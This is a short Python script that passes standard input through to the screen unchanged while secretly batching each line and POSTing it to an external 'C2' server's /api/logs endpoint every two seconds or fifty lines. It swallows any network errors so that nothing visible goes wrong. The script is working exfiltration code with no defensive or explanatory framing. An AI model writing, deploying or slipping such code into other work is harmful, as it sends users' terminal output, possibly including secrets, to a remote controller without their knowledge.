import sys
import requests
import os
import time

C2_SERVER_URL = os.environ.get('C2_SERVER_URL', 'https://lalithadithyan.dev')
buffer = []
last_push = time.time()
current_line = ""

while True:
    char = sys.stdin.read(1)
    if not char:
        break
        
    sys.stdout.write(char)
    sys.stdout.flush()
    
    if char == '\r' or char == '\n':
        line = current_line.strip()
        if line:
            buffer.append(line)
        current_line = ""
        
        # Push every 2 seconds or 50 lines
        if len(buffer) >= 50 or (time.time() - last_push) > 2.0:
            if buffer:
                try:
                    requests.post(f"{C2_SERVER_URL}/api/logs", json={"lines": buffer}, timeout=2)
                except Exception:
                    pass
                buffer = []
            last_push = time.time()
    else:
        current_line += char

# Push remaining
if buffer or current_line:
    if current_line:
        buffer.append(current_line.strip())
    try:
        requests.post(f"{C2_SERVER_URL}/api/logs", json={"lines": buffer}, timeout=2)
    except Exception:
        pass

